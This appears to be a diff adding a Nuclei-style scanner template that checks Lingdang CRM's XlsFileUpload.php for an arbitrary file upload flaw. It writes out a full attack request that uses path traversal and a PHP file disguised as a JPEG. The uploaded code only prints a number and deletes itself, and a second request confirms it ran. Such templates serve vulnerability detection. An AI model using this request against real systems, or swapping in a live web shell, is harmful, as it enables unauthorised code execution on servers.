@@ -1,0 +1,36 @@
+id: lingdangCRM-XlsFileUpload_php-File-upload
+
+info:
+  name: 灵当CRM XlsFileUpload.php 任意文件上传
+  author: lingdangCRM
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /crm/modules/Products/haige/XlsFileUpload.php?frommodule=1/../../../../../&cur_module=1/../storage/{{username}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="ImportXlsFile"; filename="{{username}}.php"
+        Content-Type: image/jpeg
+
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+      - |
+        GET /crm/storage/{{username}}_haige.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
